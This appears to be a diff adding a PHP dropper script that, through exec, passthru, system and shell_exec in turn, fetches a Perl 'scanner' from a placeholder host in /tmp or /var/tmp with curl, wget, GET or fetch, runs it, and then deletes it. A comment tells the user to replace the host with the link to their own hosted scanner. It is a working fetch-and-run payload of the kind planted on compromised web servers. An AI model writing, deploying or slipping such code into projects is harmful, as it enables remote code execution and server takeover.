@@ -1,0 +1,37 @@
+<?php                                   
+echo exec('cd /tmp;curl -O http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo exec('cd /tmp;GET http://site.com/scanner.txt > scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo exec('cd /tmp;wget http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo exec('cd /tmp;fetch http://site.com/scanner.txt;rm -rf scanner.txt*;');
+echo passthru('cd /tmp;fetch http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo passthru('cd /tmp;wget http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo passthru('cd /tmp;curl -O http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo passthru('cd /tmp;GET http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo system('cd /tmp;curl -O http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo system('cd /tmp;GET http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo system('cd /tmp;wget http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo system('cd /tmp;fetch http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo shell_exec('cd /tmp;curl -O http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo shell_exec('cd /tmp;GET http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo shell_exec('cd /tmp;wget http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo shell_exec('cd /tmp;fetch http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo exec('cd /var/tmp;curl -O http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo exec('cd /var/tmp;GET http://site.com/scanner.txt > scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo exec('cd /var/tmp;wget http://site.com/scanner.txt ;perl scanner.txt;rm -rf scanner.txt*;');
+echo exec('cd /var/tmp;fetch http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo passthru('cd /var/tmp;fetch http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo passthru('cd /var/tmp;wget http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo passthru('cd /var/tmp;curl -O http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo passthru('cd /var/tmp;GET http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo system('cd /var/tmp;curl -O http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo system('cd /var/tmp;GET http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo system('cd /var/tmp;wget http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo system('cd /var/tmp;fetch http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo shell_exec('cd /var/tmp;curl -O http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo shell_exec('cd /var/tmp;GET http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo shell_exec('cd /var/tmp;wget http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+echo shell_exec('cd /var/tmp;fetch http://site.com/scanner.txt;perl scanner.txt;rm -rf scanner.txt*;');
+// http://site.com/scanner.txt <== Instead of this put the link where your scanner is hosted
+?> 
+
+
